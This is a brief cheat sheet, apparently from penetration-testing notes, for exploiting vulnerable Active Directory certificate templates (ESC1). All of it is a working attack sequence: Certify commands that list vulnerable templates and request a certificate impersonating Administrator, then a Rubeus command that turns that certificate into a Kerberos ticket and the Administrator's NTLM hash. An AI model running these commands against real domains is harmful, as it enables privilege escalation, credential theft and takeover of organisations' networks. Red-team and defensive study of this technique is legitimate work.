## Certificate Template Exploitation
Enum
```Certify.exe enum-templates --filter-vulnerable```
Request certificate (ESC1)
```Certify.exe request --ca <CA-Name> --template <Template-Name> --upn Administrator```
Get NTLM Hash (Use Rubeus)
```Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJK... /getcredentials```
